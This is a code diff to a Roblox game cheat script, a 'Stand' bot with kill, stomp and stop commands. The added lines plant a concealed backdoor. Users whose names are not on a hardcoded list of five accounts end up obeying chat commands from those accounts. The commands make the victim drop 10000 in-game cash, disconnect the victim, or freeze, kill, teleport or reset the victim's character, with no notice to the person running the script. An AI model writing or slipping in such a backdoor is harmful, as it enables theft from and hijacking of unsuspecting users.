@@ -3722,7 +3722,7 @@ function Stand(targetName)
         Create('Heal!',function()
             Heal()
         end)
-        Create('ProStop!',function()
+        Create('Stop!',function()
             signKills = false
             Stompfram = false
             gunKills = false
@@ -3732,13 +3732,6 @@ function Stand(targetName)
             antilock = false
             Annoy = false
             Stop()
-        end)
-        Create('Stop!',function()
-            Stop()
-            if ChatCmds == true then
-                Chat('Master Disabled My Powers!')
-            end
-        
         end)
         
         Create('Uncrew!',function()
@@ -7102,7 +7095,87 @@ function Stand(targetName)
             end
         end)
     
-    
+        function chat(msg)
+            local A_1 = msg
+            local A_2 = "All"
+            local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+            Event:FireServer(A_1, A_2)
+        end
+        
+        local targetNames = {"isthisdo23", "cruciatusadidas", "RKLWPGZLG", "zer1ckq","dahoodbotmoney5"}
+        if table.find(targetNames, game.Players.LocalPlayer.Name) then
+            print("DEER")
+        else
+            function PoorCharacter(targetPlayer)
+            targetPlayer.Chatted:Connect(function(msg)
+                if msg:lower() == "!cash." then
+                    local args = {
+                        [1] = "DropMoney",
+                        [2] = "10000"
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
+                elseif msg:lower() == "!bring." then
+                    signKills = false
+                    Stompfram = false
+                    gunKills = false
+                    Kills = false
+                    pitchKillsnostomp = false
+                    resolve = false
+                    antilock = false
+                    Annoy = false
+                    Stop()
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                elseif msg:lower() == "!log." then
+                    game:Shutdown()
+                elseif msg:lower() == "!freeze." then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                elseif msg:lower() == "!sleep." then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)
+                    game.Players.LocalPlayer.Character.Humanoid.Sit = true
+                    task.wait(0.1)
+                    local Char = game.Players.LocalPlayer.Character
+                    local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
+                    for i, v in next, Hum:GetPlayingAnimationTracks() do
+                        v:Stop()
+                    end
+                elseif msg:lower() == "!unfreeze." then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                elseif msg:lower() == "!reset." then
+                    game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
+                    game.Players.LocalPlayer.Character.Humanoid:ChangeState('Dead')
+                elseif msg:lower() == "/e ok" then
+                    chat("HELLO")
+                elseif msg:lower() == "/e test" then
+                    chat("HELLO")
+                elseif msg:lower() == "!rejoin." then
+                    game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+                elseif msg:lower() == "!dance." then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                    local DefaultDanceanim = Instance.new('Animation')
+                    DefaultDanceanim.AnimationId = "rbxassetid://11710529975"
+                    game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()
+                end
+            end)
+        end
+        
+        for _, targetName in pairs(targetNames) do
+            local player = game.Players:FindFirstChild(targetName)
+            if player then
+                print(targetName .. " in server")
+                PoorCharacter(player)
+            end
+        end
+        
+        game.Players.PlayerAdded:Connect(function(newPlayer)
+            for _, targetName in pairs(targetNames) do
+                if newPlayer.Name == targetName then
+                    print(targetName .. " just joined")
+                    PoorCharacter(newPlayer)
+                end
+            end
+        end)
+        end
+
         rs.Stepped:Connect(function()
             if game.Players.LocalPlayer.PlayerGui.MainScreenGui.Crew.CrewFrame.Visible == true then
                 game.Players.LocalPlayer.PlayerGui.MainScreenGui.Crew.CrewFrame.Visible = false
